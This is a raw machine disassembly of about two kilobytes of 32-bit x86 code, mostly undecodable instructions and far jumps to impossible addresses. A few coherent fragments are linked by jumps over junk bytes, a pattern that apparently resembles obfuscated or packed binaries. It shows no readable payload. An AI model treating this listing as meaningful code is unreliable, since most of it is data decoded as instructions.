  423c32:	cmp    dl,BYTE PTR [edx+0x2b]
  423c35:	add    dh,BYTE PTR [esi]
  423c37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c38:	lea    ebp,[eax]
  423c3a:	ret    0x772d
  423c3d:	test   ebp,0xe3240f63
  423c43:	cmc    
  423c44:	dec    esp
  423c45:	mov    cl,0x55
  423c47:	test   DWORD PTR [ecx-0x1a],ebp
  423c4a:	adc    al,0x37
  423c4c:	pop    edi
  423c4d:	rcr    BYTE PTR [eax],0xd6
  423c50:	lods   eax,DWORD PTR ds:[esi]
  423c51:	lahf   
  423c52:	push   0xffffffcc
  423c54:	cld    
  423c55:	cmp    al,0xbf
  423c57:	add    BYTE PTR [ebx-0x4191ca4a],cl
  423c5d:	movsx  esp,WORD PTR [ebx-0x4d465e5]
  423c64:	ins    BYTE PTR es:[edi],dx
  423c65:	push   ebx
  423c66:	add    eax,0x864a7603
  423c6b:	or     BYTE PTR [ebx],bl
  423c6d:	mov    dl,0xbc
  423c6f:	inc    ebx
  423c70:	and    dl,BYTE PTR [edi+0x21]
  423c73:	lods   eax,DWORD PTR ds:[esi]
  423c74:	add    ebx,DWORD PTR [esi+0x43]
  423c77:	clc    
  423c78:	int    0x51
  423c7a:	aas    
  423c7b:	daa    
  423c7c:	or     BYTE PTR [ebp+0x4ff38c13],dl
  423c82:	mov    cl,0xed
  423c84:	test   ecx,ebx
  423c86:	xchg   DWORD PTR [esi-0x72],esp
  423c89:	fistp  DWORD PTR [edx-0x7ec68f5f]
  423c8f:	or     BYTE PTR [esi-0x2438a262],cl
  423c95:	sub    cl,BYTE PTR [eax]
  423c97:	mov    eax,0x5f1bdb9
  423c9c:	shl    bl,0x2a
  423c9f:	test   ah,bh
  423ca1:	call   0xabf9c1ec
  423ca6:	sub    al,0x2f
  423ca8:	mov    dh,0x5b
  423caa:	mov    ebx,0x96e0d0f5
  423caf:	xchg   ecx,eax
  423cb0:	aas    
  423cb1:	pushf  
  423cb2:	adc    al,0x68
  423cb4:	loopne 0x423cf2
  423cb6:	imul   ebx,esp,0x644af5a
  423cbc:	jno    0x423c4b
  423cbe:	out    0xbc,eax
  423cc0:	(bad)  
  423cc1:	dec    eax
  423cc2:	jno    0x423d28
  423cc4:	mov    ah,0x89
  423cc6:	adc    eax,0xb949ff99
  423ccb:	mov    dl,0x9a
  423ccd:	ror    BYTE PTR [ebx-0x3616efbb],cl
  423cd3:	add    BYTE PTR [eax],al
  423cd5:	add    BYTE PTR [eax-0x327537eb],dl
  423cdb:	(bad)  
  423cdd:	pop    ds
  423cde:	or     BYTE PTR [esi+0x4d933ab],bl
  423ce4:	lahf   
  423ce5:	mov    esp,0x1a579
  423cea:	mov    cl,0x0
  423cec:	add    BYTE PTR [eax],al
  423cee:	or     eax,0xcd2febfb
  423cf3:	sub    al,0x3b
  423cf5:	inc    edi
  423cf6:	xchg   BYTE PTR [edi-0x2ba25a18],bl
  423cfc:	mov    ch,0x9a
  423cfe:	fs sbb al,0x40
  423d01:	data16 jle 0x423d00
  423d04:	data16 and ah,bl
  423d07:	cmp    ebp,DWORD PTR [eax-0xe]
  423d0a:	sub    bh,ch
  423d0c:	xor    al,0xf3
  423d0e:	lods   eax,DWORD PTR ds:[esi]
  423d0f:	xor    al,dh
  423d11:	jmp    0xc363:0xabd11b5c
  423d18:	mov    ecx,0x3bce5749
  423d1d:	and    DWORD PTR [edx-0x5409731d],ebp
  423d23:	lds    ecx,FWORD PTR [ebx-0x5609b92c]
  423d29:	std    
  423d2a:	jo     0x423d65
  423d2c:	out    0xba,al
  423d2e:	ret    0xeb82
  423d31:	test   BYTE PTR [ecx],dh
  423d33:	jmp    0x3d9e:0x78a770cb
  423d3a:	fwait
  423d3b:	dec    ecx
  423d3c:	test   DWORD PTR [ecx],ecx
  423d3e:	push   ebx
  423d3f:	pop    ebx
  423d40:	hlt    
  423d41:	mov    edx,0x8311d804
  423d46:	leave  
  423d47:	test   eax,0x12e69982
  423d4c:	mov    bh,0xf2
  423d4e:	cmc    
  423d4f:	out    dx,eax
  423d50:	cld    
  423d51:	das    
  423d52:	push   esi
  423d53:	call   0x4ec4d5f0
  423d58:	jb     0x423cf8
  423d5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d5b:	fimul  DWORD PTR [eax+0x14]
  423d5e:	cmp    DWORD PTR [edx-0x51179a3c],ebp
  423d64:	jbe    0x423da2
  423d66:	dec    edi
  423d67:	mov    bh,0xdb
  423d69:	(bad)  
  423d6a:	out    dx,eax
  423d6b:	je     0x423d67
  423d6d:	xchg   ecx,eax
  423d6e:	push   es
  423d6f:	cmp    DWORD PTR [ebp+0xe],0xfffffffc
  423d73:	adc    ah,BYTE PTR [edx]
  423d75:	cmp    BYTE PTR [esi+0x6db901f5],al
  423d7b:	lds    edx,FWORD PTR [esi+ebp*4]
  423d7e:	dec    edx
  423d7f:	sub    dl,al
  423d81:	or     DWORD PTR [edx+0x4a],esi
  423d84:	push   ebx
  423d85:	inc    ecx
  423d86:	sbb    al,0xcc
  423d88:	cmc    
  423d89:	add    al,0x74
  423d8b:	pop    ecx
  423d8c:	iret   
  423d8d:	imul   esp,DWORD PTR [esi+0x3fd6adac],0x107b923
  423d97:	push   cs
  423d98:	scas   al,BYTE PTR es:[edi]
  423d99:	cs mov ecx,0x87f21dff
  423d9f:	mov    ecx,DWORD PTR [ebp+0x14]
  423da2:	xor    eax,esi
  423da4:	sub    eax,edi
  423da6:	pop    edi
  423da7:	pop    esi
  423da8:	pop    ebx
  423da9:	leave  
  423daa:	ret    0x10
  423dad:	xor    eax,eax
  423daf:	or     eax,DWORD PTR ds:0x42f5ac
  423db5:	or     eax,DWORD PTR ds:0x42f624
  423dbb:	mov    ds:0x42f5ac,eax
  423dc0:	push   ebx
  423dc1:	sbb    eax,DWORD PTR ds:0x42f56c
  423dc7:	push   esi
  423dc8:	sbb    DWORD PTR ds:0x42f65c,0x6952
  423dd2:	mov    eax,DWORD PTR [esp+0x18]
  423dd6:	or     eax,eax
  423dd8:	mov    DWORD PTR ds:0x42f640,0x488e
  423de2:	jmp    0x423eb9
  423de7:	jp     0x423e4d
  423de9:	inc    ebp
  423dea:	rcr    BYTE PTR [edi-0xd],cl
  423ded:	(bad)  
  423dee:	in     al,dx
  423def:	add    BYTE PTR [ebx-0x3],dh
  423df2:	imul   eax,DWORD PTR [ebp+ebx*4-0x1],0x1a62a67
  423dfa:	add    BYTE PTR [edx+0x7a000000],bh
  423e00:	test   BYTE PTR [eax],cl
  423e02:	loop   0x423e10
  423e04:	push   esp
  423e05:	xchg   ebx,eax
  423e06:	das    
  423e07:	js     0x423da5
  423e09:	clc    
  423e0a:	mov    ds:0xd714b4d,eax
  423e0f:	test   eax,0x1d3bfa18
  423e14:	aaa    
  423e15:	xchg   ebp,eax
  423e16:	or     DWORD PTR [eax+0x3c0ca82e],edi
  423e1c:	push   0x6c49cfb3
  423e21:	mov    WORD PTR [esi-0x6d9a24fc],ss
  423e27:	sub    eax,0x6ea88be8
  423e2c:	sub    BYTE PTR [edi+ebx*2],cl
  423e2f:	or     al,0xa4
  423e31:	sbb    bl,cl
  423e33:	test   DWORD PTR [ebp+0x6f58d9e3],esi
  423e39:	pop    es
  423e3a:	retf   0x829f
  423e3d:	jne    0x423ea8
  423e3f:	inc    BYTE PTR ds:0xd143864c
  423e45:	add    esp,DWORD PTR [edx-0x14a2ccd3]
  423e4b:	das    
  423e4c:	xchg   esp,eax
  423e4d:	sub    edi,DWORD PTR [edi]
  423e4f:	enter  0x9cba,0x48
  423e53:	jmp    0xaca07789
  423e58:	call   0x6b78:0x75e77d19
  423e5f:	repnz std 
  423e61:	mov    ds:0x360e5e25,eax
  423e66:	mov    ds:0xc829360a,al
  423e6b:	jbe    0x423edb
  423e6d:	jge    0x423e0d
  423e6f:	pusha  
  423e70:	inc    edi
  423e71:	cmp    edi,DWORD PTR [edx-0x4497edd2]
  423e77:	inc    edx
  423e78:	pusha  
  423e79:	enter  0x4fed,0xa0
  423e7d:	(bad)  
  423e7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e7f:	jbe    0x423ee0
  423e81:	push   ecx
  423e82:	fimul  DWORD PTR [edi-0x50]
  423e85:	mov    al,0x94
  423e87:	mov    ebp,0x94740a87
  423e8c:	mov    DWORD PTR [ebx+0x3019a8f],0x7d7dc829
  423e96:	retf   
  423e97:	loop   0x423e74
  423e99:	sub    al,0xe4
  423e9b:	mov    ebx,0xd9d2a63e
  423ea0:	inc    eax
  423ea1:	xchg   BYTE PTR [ebp-0x24],bl
  423ea4:	or     al,0xb1
  423ea6:	mov    dh,0x1c
  423ea8:	inc    edi
  423ea9:	aas    
  423eaa:	fistp  QWORD PTR [edi+0x1d]
  423ead:	jbe    0x423e9b
  423eaf:	jmp    0x423ef8
  423eb1:	sub    DWORD PTR [edx],ecx
  423eb3:	rcr    dh,0xa0
  423eb6:	or     BYTE PTR [ebp+0x5b],al
  423eb9:	jne    0x42419e
  423ebf:	mov    ecx,DWORD PTR [esp+0x14]
  423ec3:	mov    eax,DWORD PTR [esp+0x10]
  423ec7:	movzx  ebx,WORD PTR ds:0x42f5c4
  423ece:	sub    ebx,DWORD PTR ds:0x42f5f4
  423ed4:	mov    DWORD PTR ds:0x42f5c4,ebx
  423eda:	xor    edx,edx
  423edc:	cmp    DWORD PTR ds:0x42f5bc,0x0
  423ee3:	jge    0x423f08
  423ee9:	xor    DWORD PTR ds:0x42f5cc,edx
  423eef:	jmp    0x423f08
  423ef4:	push   DWORD PTR [ebp-0x18]
  423ef7:	push   DWORD PTR [ebp-0x18]
  423efa:	push   DWORD PTR [ebp-0x1c]
  423efd:	push   0x7df4
  423f02:	call   DWORD PTR ds:0x4387b8
  423f08:	div    ecx
  423f0a:	jmp    0x423fe1
  423f0f:	lock xchg ebx,eax
  423f11:	out    dx,al
  423f12:	and    eax,0xd7fb7def
  423f17:	dec    edi
  423f18:	arpl   WORD PTR [edi],si
  423f1a:	xchg   edx,eax
  423f1b:	xor    al,BYTE PTR [edi-0x591b2137]
  423f21:	add    DWORD PTR [eax],eax
  423f23:	mov    edx,0x37000000
  423f28:	call   0xe23d:0xf6a318b6
  423f2f:	xchg   esp,eax
  423f30:	jo     0x423f49
  423f32:	adc    eax,0xb76412cd
  423f37:	retf   0xbcde
  423f3a:	push   edx
  423f3b:	imul   esi,DWORD PTR [ebx+ebp*2+0x46],0x20845b0f
  423f43:	and    esi,ebx
  423f45:	ins    BYTE PTR es:[edi],dx
  423f46:	sub    al,0x7a
  423f48:	sub    DWORD PTR [esi],edi
  423f4a:	adc    BYTE PTR [edx+0x3f],ah
  423f4d:	stc    
  423f4e:	out    0xae,al
  423f50:	xchg   DWORD PTR [esp+edx*2-0x7b0a4629],edx
  423f57:	inc    edi
  423f58:	adc    BYTE PTR [eax+0x32],0x9
  423f5c:	xlat   BYTE PTR ds:[ebx]
  423f5d:	mov    ebp,ebp
  423f5f:	test   al,0x2a
  423f61:	lds    esi,FWORD PTR [esi+ebx*2]
  423f64:	jg     0x423f5f
  423f66:	jmp    0xac09:0x5f1399bb
  423f6d:	mov    WORD PTR [eax],?
  423f6f:	add    ecx,DWORD PTR [ecx]
  423f71:	inc    ebp
  423f72:	mov    ecx,DWORD PTR [esi]
  423f74:	mov    ebp,es
  423f76:	ror    DWORD PTR [edi],0x58
  423f79:	or     ebx,DWORD PTR [edx-0x591ddd8]
  423f7f:	enter  0x7c0,0xfd
  423f83:	xchg   ecx,eax
  423f84:	(bad)  
  423f85:	jmp    0xda9e:0x8dedca15
  423f8c:	(bad)  
  423f8d:	aam    0xdd
  423f8f:	aaa    
  423f90:	jae    0x423fe7
  423f92:	dec    esp
  423f93:	push   edx
  423f94:	popa   
  423f95:	mov    ebx,0xab2260c9
  423f9a:	push   ebp
  423f9b:	sti    
  423f9c:	adc    BYTE PTR [ebx-0x26],0x8c
  423fa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fa1:	inc    ebp
  423fa2:	lods   al,BYTE PTR ds:[esi]
  423fa3:	call   0x881ac0a1
  423fa8:	xor    eax,0x97ac53b6
  423fad:	jbe    0x423f91
  423faf:	or     eax,esp
  423fb1:	ror    DWORD PTR [edi-0x58],1
  423fb4:	into   
  423fb5:	adc    eax,DWORD PTR [ebx-0x12c2a32a]
  423fbb:	mov    dl,0x99
  423fbd:	push   esp
  423fbe:	cmp    eax,0x3d7c464b
  423fc3:	push   cs
  423fc4:	inc    ebx
  423fc5:	dec    esp
  423fc6:	test   DWORD PTR [ebp-0x30],edi
  423fc9:	outs   dx,BYTE PTR ds:[esi]
  423fca:	xchg   BYTE PTR [edi-0x771dc55],cl
  423fd0:	pushf  
  423fd1:	scas   al,BYTE PTR es:[edi]
  423fd2:	mov    ebx,0x529b5a2
  423fd7:	mov    bl,BYTE PTR [ebp-0x45]
  423fda:	xchg   edi,eax
  423fdb:	mov    ch,0xcb
  423fdd:	imul   ebp,DWORD PTR [ebp-0x2774e19f],0xffffffe9
  423fe4:	rol    BYTE PTR [eax],cl
  423fe6:	add    BYTE PTR [eax],al
  423fe8:	hlt    
  423fe9:	and    edi,DWORD PTR [esi-0x16200f0]
  423fef:	out    0xff,eax
  423ff1:	push   0x5193e4af
  423ff6:	xor    eax,0x1a79e74
  423ffb:	add    BYTE PTR [edx-0x1b000000],bh
  424001:	in     al,dx
  424002:	inc    ebp
  424003:	pop    eax
  424004:	sub    eax,0x7749c2
  424009:	iret   
  42400a:	push   di
  42400c:	and    DWORD PTR [ebx-0x5250c6b9],ebp
  424012:	imul   ebx,DWORD PTR [esi+0x8],0xdc966e0
  424019:	mov    bh,0x6a
  42401b:	or     ecx,esi
  42401d:	rcr    BYTE PTR [ecx-0x21cc96],cl
  424023:	fsub   DWORD PTR [esp+edi*4]
  424026:	sar    DWORD PTR [edi],0x16
  424029:	mov    esp,DWORD PTR [ebp+0x1945455e]
  42402f:	test   eax,0xaa2fc44e
  424034:	jg     0x423fd2
  424036:	sub    cl,BYTE PTR [ebp-0x5a]
  424039:	aas    
  42403a:	out    dx,al
  42403b:	push   ecx
  42403c:	and    al,0x6f
  42403e:	scas   eax,DWORD PTR es:[edi]
  42403f:	mov    bh,0x4
  424041:	add    eax,0xb39aad68
  424046:	les    ecx,FWORD PTR [edx+0x7d5c87bd]
  42404c:	sub    dh,BYTE PTR [esi+0x79]
  42404f:	nop
  424050:	scas   al,BYTE PTR es:[edi]
  424051:	push   ss
  424052:	lds    edx,FWORD PTR [ecx+0x3b2a79e0]
  424058:	xchg   ebp,eax
  424059:	fcomp  DWORD PTR [ebx+0x7]
  42405c:	and    ah,BYTE PTR [edx+0x252ef789]
  424062:	das    
  424063:	jo     0x424065
  424065:	adc    eax,0x138dae23
  42406a:	or     DWORD PTR [esi-0x63],esi
  42406d:	mov    dl,0x3b
  42406f:	jle    0x424053
  424071:	mov    ah,0x93
  424073:	xor    al,0x56
  424075:	mov    al,ds:0x4be6ee8c
  42407a:	ss bound esi,QWORD PTR gs:[esi-0xa]
  42407f:	leave  
  424080:	sub    eax,0x73d8b44e
  424085:	cld    
  424086:	mov    edx,0x5a0ba85
  42408b:	fld    DWORD PTR [esi+0x3f]
  42408e:	sbb    eax,0x58becb4d
  424093:	outs   dx,DWORD PTR ds:[esi]
  424094:	std    
  424095:	ror    ah,cl
  424097:	es xor eax,0x2909dc95
  42409d:	(bad)  [ebx]
  42409f:	cmp    ch,BYTE PTR [eax+ecx*4-0x333a2b5c]
  4240a6:	call   0x1be9:0x510e3503
  4240ad:	lea    ebx,[eax]
  4240af:	fsubp  st(5),st
  4240b1:	jnp    0x4240aa
  4240b3:	sbb    eax,0x7d9d7c73
  4240b8:	adc    eax,0x24448b8f
  4240bd:	or     al,0xe9
  4240bf:	rol    BYTE PTR [eax],cl
  4240c1:	add    BYTE PTR [eax],al
  4240c3:	fimul  WORD PTR [ebx]
  4240c5:	clc    
  4240c6:	cdq    
  4240c7:	std    
  4240c8:	sti    
  4240c9:	dec    DWORD PTR [edi-0x79]
  4240cc:	fsubr  QWORD PTR [eax]
  4240ce:	fisubr WORD PTR [ecx-0x7]
  4240d1:	inc    ebp
  4240d2:	gs pop eax
  4240d4:	test   al,0x1
  4240d6:	add    BYTE PTR [edx-0x1000000],bh
  4240dc:	ss xchg ebp,eax
  4240de:	dec    ebx
  4240df:	pop    ds
  4240e0:	ret    
  4240e1:	mov    ah,0x98
  4240e3:	adc    dh,bl
  4240e5:	inc    esi
  4240e6:	inc    ecx
  4240e7:	push   ebp
  4240e8:	shl    BYTE PTR [edx],1
  4240ea:	jle    0x424150
  4240ec:	mov    eax,0x5932837
  4240f1:	jo     0x424155
  4240f3:	dec    eax
  4240f4:	ret    
  4240f5:	hlt    
  4240f6:	arpl   WORD PTR [ecx+0x5],bx
  4240f9:	push   cs
  4240fa:	xlat   BYTE PTR ds:[ebx]
  4240fb:	pusha  
  4240fc:	and    BYTE PTR [eax],ch
  4240fe:	arpl   dx,sp
  424100:	into   
  424101:	retf   
  424102:	jnp    0x4240b9
  424104:	or     BYTE PTR [edx+esi*8+0xd255d3d],cl
  42410b:	cmp    eax,0x2b4ec4df
  424110:	ret    0x253b
  424113:	xchg   ecx,eax
  424114:	or     al,0x34
  424116:	mov    esp,0x24cc5ab8
  42411b:	cdq    
  42411c:	mov    eax,0x62790318
  424121:	add    BYTE PTR [edx+ebp*4],bl
  424124:	das    
  424125:	xchg   esp,eax
  424126:	mov    BYTE PTR [edi+0x1097d40d],cl
  42412c:	jo     0x4240af
  42412e:	pop    eax
  42412f:	test   eax,0xe3259335
  424134:	dec    eax
  424135:	out    0x11,al
  424137:	jmp    0x7e99:0x5acf0f8d
  42413e:	cmp    al,0xf6
  424140:	sub    BYTE PTR [ebx+0x34],0xbb
  424144:	fisub  WORD PTR [ebp+0xc]
  424147:	popa   
  424148:	adc    DWORD PTR [esp+ebx*2-0x23],ebp
  42414c:	jae    0x4241b6
  42414e:	jnp    0x42412f
  424150:	fmul   QWORD PTR [ebp-0x7dfc2d24]
  424156:	jb     0x42419a
  424158:	xlat   BYTE PTR ds:[ebx]
  424159:	stos   DWORD PTR es:[edi],eax
  42415a:	cwde   
  42415b:	neg    BYTE PTR [ebx+0x120adc9e]
  424161:	leave  
  424162:	adc    DWORD PTR [edi+0x2ea0aac3],ebp
  424168:	int    0x9a
  42416a:	std    
  42416b:	ins    DWORD PTR es:[edi],dx
  42416c:	gs hlt 
  42416e:	jl     0x424199
  424170:	stos   DWORD PTR es:[edi],eax
  424171:	retf   
  424172:	mov    dh,0x9a
  424174:	test   BYTE PTR [ebx-0x60f44d07],bl
  42417a:	add    BYTE PTR [edx],0x30
  42417d:	gs daa 
  42417f:	rol    BYTE PTR [edi+0x48eb9816],0xb7
  424186:	sbb    BYTE PTR [edx-0x713805f7],al
  42418c:	shl    DWORD PTR [eax],1
  42418e:	aaa    
  42418f:	pop    ss
  424190:	ins    BYTE PTR es:[edi],dx
  424191:	pop    eax
  424192:	adc    BYTE PTR [edi-0x76],0xf7
  424196:	icebp  
  424197:	mov    edx,ebx
  424199:	jmp    0x4248ca
  42419e:	mov    ecx,eax
  4241a0:	sub    eax,0x5595
  4241a5:	mov    ebx,DWORD PTR [esp+0x14]
  4241a9:	mov    edx,DWORD PTR [esp+0x10]
  4241ad:	or     eax,DWORD PTR ds:0x42f538
  4241b3:	jmp    0x42428a
  4241b8:	and    bh,al
  4241ba:	dec    eax
  4241bb:	sub    dl,bl
  4241bd:	mov    eax,0xbd00fa62
  4241c2:	fistp  QWORD PTR [edi]
  4241c4:	fstp   QWORD PTR [edi-0x56edc0ce]
  4241ca:	add    DWORD PTR [eax],eax
  4241cc:	mov    edx,0xb6000000
  4241d1:	xor    BYTE PTR [ebp+0x962bd62],dh
  4241d7:	sar    BYTE PTR [ebx],0x6e
  4241da:	out    0x17,al
  4241dc:	test   al,0x72
  4241de:	inc    ecx
  4241df:	pushf  
  4241e0:	dec    edi
  4241e1:	add    eax,0x6573257a
  4241e6:	mov    eax,ds:0x23c31431
  4241eb:	lahf   
  4241ec:	jp     0x424225
  4241ee:	inc    esp
  4241ef:	xchg   ebx,eax
  4241f0:	call   0x657:0xd8f9b370
  4241f7:	and    cl,BYTE PTR [ecx]
  4241f9:	mov    ss,edx
  4241fb:	nop
  4241fc:	pop    eax
  4241fd:	es inc edi
  4241ff:	loop   0x4241e1
  424201:	dec    ebp
  424202:	mov    esi,DWORD PTR [ebx-0x53216bbc]
  424208:	ss push es
  42420a:	sti    
  42420b:	out    0x60,al
  42420d:	inc    edi
  42420e:	xor    al,BYTE PTR [ebx+0x7e7871f5]
  424214:	shr    BYTE PTR [ebx-0x2a514454],cl
  42421a:	loop   0x4241f3
  42421c:	xor    BYTE PTR [ecx-0x79],dl
  42421f:	cmp    edi,DWORD PTR [edx]
  424221:	dec    ebp
  424222:	sbb    esi,esp
  424224:	cs test eax,0xfd0d38d8
  42422a:	cmp    ecx,ecx
  42422c:	dec    edi
  42422d:	add    al,0x19
  42422f:	test   eax,0x4c7711b
  424234:	adc    eax,0xf656619e
  424239:	xor    bh,BYTE PTR [esi-0x11]
  42423c:	or     BYTE PTR [esi],bh
  42423e:	das    
  42423f:	xor    ebp,DWORD PTR [eax+0x940aaf9]
  424245:	add    BYTE PTR [ebx+0x3a293883],0x7a
  42424c:	mov    ah,0x6a
  42424e:	(bad)  
  42424f:	jae    0x42423c
  424251:	into   
  424252:	adc    BYTE PTR [edx+0x58],0xc6
  424256:	mov    eax,ds:0xc0302ba4
  42425b:	es mov cl,0xc1
  42425e:	mov    ebx,0x3c926fab
  424263:	(bad)  
  424264:	(bad)  
  424265:	sub    eax,0xe59a5cc1
  42426a:	mov    eax,0xfb21059a
  42426f:	clc    
  424270:	mov    ds:0xfc69c6c3,eax
  424275:	ja     0x4242a7
  424277:	pushf  
  424278:	popa   
  424279:	retf   
  42427a:	sub    eax,0xd95a538e
  42427f:	jne    0x42420e
  424281:	add    bl,BYTE PTR [eax]
  424283:	fisubr DWORD PTR [edx-0x48728bce]
  424289:	test   DWORD PTR [ebx-0x7ef3dbbc],0x42f5f005
  424293:	add    BYTE PTR [ebp+esi*8+0x42],ah
  424297:	add    cl,dl
  424299:	jmp    0xf6164865
  42429e:	inc    edx
  42429f:	add    dh,cl
  4242a1:	cmp    DWORD PTR [eax],eax
  4242a3:	add    cl,dl
  4242a5:	fcmovnbe st,st(1)
  4242a7:	jmp    0xf600:0xd2e9
  4242ae:	call   0xbec08129
  4242b3:	(bad)  
  4242b4:	call   0xc7a5279d
  4242b9:	add    BYTE PTR [edi],dh
  4242bb:	mov    al,ds:0x1a9cc70
  4242c0:	add    BYTE PTR [edx-0x7000000],bh
  4242c6:	das    
  4242c7:	daa    
  4242c8:	xchg   ebp,eax
  4242c9:	ret    
  4242ca:	pusha  
  4242cb:	fistp  QWORD PTR es:[ecx-0x6337141e]
  4242d2:	jb     0x424260
  4242d4:	push   ss
  4242d5:	jnp    0x42427a
  4242d7:	mov    bh,0x8f
  4242d9:	jnp    0x424263
  4242db:	out    0x32,al
  4242dd:	push   0x8f57a0b7
  4242e2:	push   ss
  4242e3:	xor    DWORD PTR [ebx+ebx*4-0x24],esi
  4242e7:	es ins DWORD PTR es:[edi],dx
  4242e9:	push   edi
  4242ea:	push   es
  4242eb:	inc    esp
  4242ec:	sub    DWORD PTR [esi],ecx
  4242ee:	push   ds
  4242ef:	repnz inc esp
  4242f1:	adc    eax,0xa5527163
  4242f6:	mov    eax,DWORD PTR [eax+0x39]
  4242f9:	xlat   BYTE PTR ds:[ebx]
  4242fa:	adc    al,0x67
  4242fc:	repz xor ch,BYTE PTR ds:0x196d1cf4
  424303:	je     0x4242e5
  424305:	scas   al,BYTE PTR es:[edi]
  424306:	(bad)  
  424307:	std    
  424308:	xchg   esi,eax
  424309:	rol    BYTE PTR [ebx-0x4b616f46],1
  42430f:	aam    0xf5
  424311:	inc    ecx
  424312:	mov    ah,0x26
  424314:	jecxz  0x424341
  424316:	lahf   
  424317:	push   0x3b
  424319:	popf   
  42431a:	sbb    BYTE PTR [ecx],al
  42431c:	and    al,BYTE PTR [ecx]
  42431e:	pop    eax
  42431f:	(bad)  
  424320:	(bad)  
  424321:	jge    0x424300
  424323:	mov    WORD PTR [edx+0xe1cae6],cs
  424329:	outs   dx,BYTE PTR ds:[esi]
  42432a:	dec    ebx
  42432b:	jl     0x424344
  42432d:	sub    al,0xe3
  42432f:	push   ebp
  424330:	and    eax,0xfb2a9a61
  424335:	call   0x1ac1:0x96bc08b2
  42433c:	scas   eax,DWORD PTR es:[edi]
  42433d:	repz fs dec ecx
  424340:	mul    BYTE PTR [esi]
  424342:	adc    eax,DWORD PTR [edi-0x3d6e0c5b]
  424348:	sbb    al,0x8c
  42434a:	cmp    al,0x12
  42434c:	xrelease xchg DWORD PTR [ebp-0x17bb34af],esp
  424353:	sub    al,0xed
  424355:	and    BYTE PTR [eax-0x23e40fae],0xcf
  42435c:	sbb    eax,0x3fae6fbf
  424361:	ds push 0x77f0bbcc
  424367:	adc    eax,0x9c7de405
  42436c:	sub    al,0xd8
  42436e:	mov    ds:0x2e84a900,al
  424373:	adc    eax,DWORD PTR [edi]
  424375:	fisttp QWORD PTR [esi]
  424377:	cs jmp 0x7a0d:0xad913f6d
  42437f:	rcr    eax,1
  424381:	or     ecx,ecx
  424383:	jne    0x42428e
  424389:	div    ebx
  42438b:	jmp    0x424462
  424390:	xor    BYTE PTR [ebx],ah
  424392:	mov    ebx,0x3ab9bbb1
  424397:	mov    ds:0xf33061d,eax
  42439c:	dec    edx
  42439d:	push   ds
  42439e:	xchg   esp,eax
  42439f:	or     eax,0x1aa86
  4243a4:	mov    edx,0x14000000
  4243a9:	mov    edi,0x6b762205
  4243ae:	inc    edx
  4243af:	(bad)  
  4243b0:	dec    ebx
  4243b1:	cdq    
  4243b2:	xor    ecx,DWORD PTR [ecx]
  4243b4:	adc    ch,0xba
  4243b7:	and    ah,bl
  4243b9:	ficomp DWORD PTR [ebx+ebp*8]
  4243bc:	fnstenv [edi]
  4243be:	mov    ds:0x8e8f03f0,al
  4243c3:	pop    ds
  4243c4:	mov    bh,0x9
  4243c6:	inc    ebp
  4243c7:	sub    ebp,DWORD PTR [edx+edx*8+0x37]
  4243cb:	dec    edi
  4243cc:	imul   esi,DWORD PTR [ecx-0x42],0xc2433872
  4243d3:	addr16 ret 0xebd4
  4243d7:	mov    ah,0x72
  4243d9:	mov    ebp,DWORD PTR [ecx]
  4243db:	fcmovnu st,st(1)
  4243dd:	dec    edx
  4243de:	aas    
  4243df:	rcl    DWORD PTR [edi+0x11],1
  4243e2:	jp     0x42438d
  4243e4:	push   ecx
  4243e5:	sar    DWORD PTR [edi+0x1322ca66],1
  4243eb:	push   ss
  4243ec:	les    ecx,FWORD PTR [ecx-0x21e70b48]
  4243f2:	mov    edx,0xf7290d6c
  4243f7:	ret    
  4243f8:	add    esi,DWORD PTR [edi-0x225d63d7]
  4243fe:	cmp    eax,0x3b244ebf
  424403:	push   0xf80d6d03
  424408:	push   cs
  424409:	pop    ecx
  42440a:	hlt    
  42440b:	xchg   edi,ecx
  42440d:	lods   eax,DWORD PTR ds:[esi]
  42440e:	pop    edi
  42440f:	dec    edi
  424410:	data16 aad 0xfa
  424413:	ret    
  424414:	push   esi
  424415:	fnstsw ax
  424417:	pushf  
  424418:	(bad)  
  424419:	cmp    ebp,DWORD PTR ds:0x5391a868
  42441f:	cmp    esp,esi
  424421:	out    0x90,al
  424423:	in     al,dx
  424424:	or     bl,al
  424426:	clc    
  424427:	js     0x4243c2
  424429:	rcr    DWORD PTR [eax-0x14],0x42
  42442d:	les    esi,FWORD PTR [esi-0x38]
  424430:	cmp    eax,DWORD PTR [esi-0x5526be14]
  424436:	mov    edx,0x42c15abd
  42443b:	bound  ecx,QWORD PTR [ebx-0x4d48be70]
  424441:	mov    cl,0xba
  424443:	mov    es,WORD PTR ds:0x28d31fdb
  424449:	fldcw  WORD PTR [edx+0x6f]
  42444c:	ret    
  42444d:	les    ebx,FWORD PTR [ecx]
  42444f:	mov    al,ds:0x80865732
  424454:	pop    edx
  424455:	lods   eax,DWORD PTR ds:[esi]
  424456:	sub    eax,0xc6481c18
  42445b:	or     DWORD PTR [esi+0x7b],ebp
  42445e:	and    DWORD PTR [esi+0x6d],esi
  424461:	ins    BYTE PTR es:[edi],dx
  424462:	mov    esi,eax
  424464:	jmp    0x42453b
  424469:	nop
  42446a:	fs sub eax,0xd4e9fde9
  424470:	jge    0x42445c
  424472:	cmp    dh,BYTE PTR [edi]
  424474:	xor    esp,DWORD PTR [ebx+0x400ffcca]
  42447a:	stos   DWORD PTR es:[edi],eax
  42447b:	add    DWORD PTR [eax],eax
  42447d:	mov    edx,0x6d000000
  424482:	sbb    eax,0x5c2eb61d
  424487:	dec    ecx
  424488:	outs   dx,BYTE PTR ds:[esi]
  424489:	pop    esp
  42448a:	lock lock clc 
  42448d:	adc    bh,dh
  42448f:	mov    esi,0x8d284f7c
  424494:	cmp    eax,0x7a063aa9
  424499:	inc    edi
  42449a:	add    BYTE PTR [ecx-0xc],dh
  42449d:	adc    BYTE PTR [edx+ecx*8],ch
  4244a0:	retf   
  4244a1:	xor    al,BYTE PTR [esi+eiz*1-0x5b]
  4244a5:	mov    ebx,0xb4b8715a
  4244aa:	push   eax
  4244ab:	pop    esp
  4244ac:	xchg   esp,eax
  4244ad:	pop    edi
  4244ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244af:	cli    
  4244b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244b1:	push   ecx
  4244b2:	pop    ss
  4244b3:	std    
